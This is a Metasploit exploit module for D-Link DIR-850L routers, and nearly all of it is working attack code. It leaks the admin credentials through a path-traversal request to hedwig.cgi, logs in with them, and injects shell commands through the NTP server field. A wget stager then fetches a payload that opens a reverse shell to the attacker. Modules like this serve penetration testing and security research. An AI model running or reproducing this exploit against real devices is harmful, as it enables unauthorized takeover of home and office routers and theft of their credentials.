##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'openssl'

class MetasploitModule < Msf::Exploit::Remote
  Rank = AverageRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'DIR-850L (Un)authenticated OS Command Exec',
      'Description' => %q{
        This module leverages an unauthenticated credential disclosure
        vulneralbility to then execute arbitrary commands on DIR-850L routers
        as an authenticated user. Unable to use Meterpreter payloads, or
        any other payload besides linux/mipsbe/shell/reverse_tcp & occasionally
        linux/mipsbe/shell_reverse_tcp.
      },
      'Author' => [
        'Mumbai <https://github.com/realoriginal>' # module
      ],
      'References' => [
        ['URL', 'https://www.seebug.org/vuldb/ssvid-96333'],
        ['URL', 'https://blogs.securiteam.com/index.php/archives/3310'],
      ],
      'DisclosureDate' => 'Aug 9 2017',
      'License' => MSF_LICENSE,
      'Platform' => 'linux',
      'Arch' => ARCH_MIPSBE,
      'DefaultTarget' => 0,
      'DefaultOptions' => {
        'PAYLOAD' => 'linux/mipsbe/shell/reverse_tcp'
      },
      'Privileged' => true,
      'Payload' => {
        'DisableNops' => true,
      },
      'Targets' => [[ 'Automatic', {} ]],
    ))
  end

  def retrieve_creds
    begin
      xml = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n"
      xml << "<postxml>\r\n"
      xml << "<module>\r\n"
      xml << "   <service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service>\r\n"
      xml << "</module>\r\n"
      xml << "</postxml>"
      uid = rand_text_alpha_lower(8)
      res = send_request_cgi({
        'uri' => '/hedwig.cgi',
        'method' => 'POST',
        'encode_params' => false,
        'headers' => {
          'Accept-Encoding' => 'gzip, deflate',
          'Accept' => '*/*'
        },
        'ctype' => 'text/xml',
        'cookie' => "uid=#{uid}",
        'data' => xml,
      })
      parse = res.get_xml_document
      username = parse.at('//name').text
      password = parse.at('//password').text
      return username, password
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unknown, "#{peer} - Unable to connect to target.")
    end
  end

  def retrieve_uid
    begin
      res = send_request_cgi({
          'uri' => '/authentication.cgi',
          'method' => 'GET',
      })
      parse = res.get_json_document
      uid = parse['uid']
      challenge = parse['challenge']
      return uid, challenge
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unknown, "#{peer} - Unable to connect to target.")
    end
  end

  def hash_passwd(username, password, challenge)
    hash = OpenSSL::HMAC.hexdigest(OpenSSL::Digest.new('md5'), password.to_s, (username.to_s + challenge.to_s)).upcase
    return hash
  end

  def login(username, hash, uid)
    begin
      data = "id=#{username}&password=#{hash}"
      res = send_request_cgi({
        'uri' => '/authentication.cgi',
        'method' => 'POST',
        'data' => data,
        'cookie' => "uid=#{uid}"
      })
      return res
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unknown, "#{peer} - Unable to connect to target.")
    end
  end

  def execute_command(cmd, opts)
    username, password = retrieve_creds
    uid, challenge = retrieve_uid
    hash = hash_passwd(username, password, challenge)
    login(username, hash, uid)
    payload = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n"
    payload << "<postxml>\r\n"
    payload << "<module>\r\n"
    payload << "        <service>DEVICE.TIME</service>\r\n"
    payload << "        <device>\r\n"
    payload << "                <time>\r\n"
    payload << "                        <ntp>\r\n"
    payload << "                                <enable>1</enable>\r\n"
    payload << "                                <period>604800</period>\r\n"
    payload << "                                <server>metelesku; (#{cmd};) &amp; exit; </server>\r\n"
    payload << "                        </ntp>\r\n"
    payload << "                        <ntp6>\r\n"
    payload << "                                <enable>1</enable>\r\n"
    payload << "                                <period>604800</period>\r\n"
    payload << "                        </ntp6>\r\n"
    payload << "                        <timezone>20</timezone>\r\n"
    payload << "                        <time/>\r\n"
    payload << "                        <date/>\r\n"
    payload << "                        <dst>0</dst>\r\n"
    payload << "                        <dstmanual/>\r\n"
    payload << "                        <dstoffset/>\r\n"
    payload << "                </time>\r\n"
    payload << "        </device>\r\n"
    payload << "</module>\r\n"
    payload << "</postxml>"
    begin
      res = send_request_cgi({
        'uri' => '/hedwig.cgi',
        'method' => 'POST',
        'ctype' => 'text/xml',
        'data' => payload,
        'cookie' => "uid=#{uid}"
        })
      res = send_request_cgi({
        'uri' => '/pigwidgeon.cgi',
        'method' => 'POST',
        'data' => 'ACTIONS=SETCFG,ACTIVATE',
        'cookie' => "uid=#{uid}"
      })
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unknown, "#{peer} - Unable to connect to target.")
    end
  end


  def exploit
    print_status("#{peer} - Initiating exploitation...")
    execute_cmdstager(
      :flavor => :wget,
      :background => true,
      :nodelete => true
    )
  end
end
